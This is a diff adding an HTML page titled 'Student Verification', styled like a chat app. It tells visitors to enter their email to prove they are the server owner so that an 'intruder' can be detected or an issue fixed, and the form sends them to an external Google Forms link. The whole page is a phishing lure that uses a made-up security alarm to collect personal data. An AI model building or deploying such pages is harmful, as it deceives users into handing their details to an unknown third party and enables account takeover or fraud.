@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Student Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            background-color: #36393f;
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        .chat-window {
+            max-width: 800px;
+            margin: 30px auto;
+            background-color: #2f3136;
+            border-radius: 10px;
+            box-shadow: 0 0 15px #00000080;
+            padding: 20px;
+        }
+
+        .message {
+            background-color: #40444b;
+            color: #ffffff;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            text-align: left;
+            display: flex;
+            align-items: center;
+        }
+
+        .message i {
+            margin-right: 10px;
+            color: #faa61a;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            margin-top: 10px;
+        }
+
+        input[type="email"] {
+            padding: 12px;
+            border-radius: 5px;
+            border: none;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        input[type="email"]:focus {
+            outline: none;
+            box-shadow: 0 0 5px #7289da;
+        }
+
+        button {
+            background-color: #7289da;
+            color: #ffffff;
+            border: none;
+            padding: 12px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+
+        button:hover {
+            background-color: #5b6eae;
+            transform: translateY(-2px);
+            box-shadow: 0 2px 10px #00000050;
+        }
+
+        button:active {
+            transform: translateY(1px);
+            box-shadow: none;
+        }
+
+        button i {
+            margin-right: 8px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="chat-window">
+    <div class="message">
+        <i class="fas fa-exclamation-triangle"></i>
+        To solve the problem, detect the intruder, or fix the issue, you must enter your email to verify that you are the server owner.
+    </div>
+
+    <form action="https://docs.google.com/forms/d/e/1FAIpQLSf6d9Ht3PbJOkU7omen_Sb6qwPu_-V7uCCaJGB_KO6Wuagdaw/viewform?usp=header" target="_blank">
+        <input type="email" placeholder="Enter your email" required>
+        <button type="submit"><i class="fas fa-check"></i> Submit</button>
+    </form>
+</div>
+
+</body>
+</html>
